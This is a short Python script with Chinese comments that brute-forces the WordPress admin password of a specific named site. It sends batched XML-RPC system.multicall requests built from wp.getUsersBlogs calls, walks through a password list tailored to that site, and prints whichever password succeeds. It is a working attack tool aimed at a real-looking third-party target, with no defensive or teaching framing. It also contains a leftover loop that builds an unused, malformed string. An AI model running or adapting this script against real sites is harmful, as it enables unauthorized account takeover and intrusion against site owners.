#!/usr/bin/env python3
"""WordPress xmlrpc multicall爆破"""
import urllib.request, xml.etree.ElementTree as ET

URL = "http://showerlee.com/xmlrpc.php"
passwords = ["admin", "123456", "admin123", "admin888", "12345678", "password",
             "showerlee", "showerlee123", "admin@123", "Admin123", "admin2016",
             "admin2017", "admin2018", "admin2019", "admin2020", "admin2021",
             "admin2022", "admin2023", "admin2024", "admin2025", "woshishei",
             "woshishui", "showerlee.com", "sl123456", "sladmin", "12345678a",
             "qwerty", "abc123", "111111", "123123", "666666", "888888",
             "a123456", "aa123456", "123456789", "1234567890", "woaini",
             "woainima", "iloveyou", "password123", "passw0rd", "P@ssw0rd"]

def build_multicall(user, pwds):
    calls = []
    for p in pwds:
        call = f"""<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>{user}</string></value></param><param><value><string>{p}</string></value></param></params></methodCall>"""
        calls.append(f"<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data>{'<value><string>%s</string></value>'}</data></array></value></data></array></value></member></struct></value>".replace("'", '"') % "")
    # simpler: use literal string
    body = """<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>"""
    for p in pwds:
        body += f"""<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{user}</string></value><value><string>{p}</string></value></data></array></value></data></array></value></member></struct></value>"""
    body += "</data></array></value></param></params></methodCall>"
    return body

# 分批,每批10个密码
for i in range(0, len(passwords), 10):
    batch = passwords[i:i+10]
    body = build_multicall("admin", batch)
    try:
        req = urllib.request.Request(URL, data=body.encode(), headers={"Content-Type":"text/xml"})
        resp = urllib.request.urlopen(req, timeout=15).read().decode("utf-8","ignore")
        # 检查结果 - fault 403 = 密码错误; isAdmin = 正确
        if "isAdmin" in resp:
            print(f"!!! 找到密码: {batch}", flush=True)
            for p in batch:
                if f">{p}<" in resp:
                    print(f"!!! admin/{p} 正确!", flush=True)
            break
        else:
            print(f"[{i}] 本批无命中", flush=True)
    except Exception as e:
        print(f"[{i}] ERR: {str(e)[:60]}", flush=True)

print("DONE")
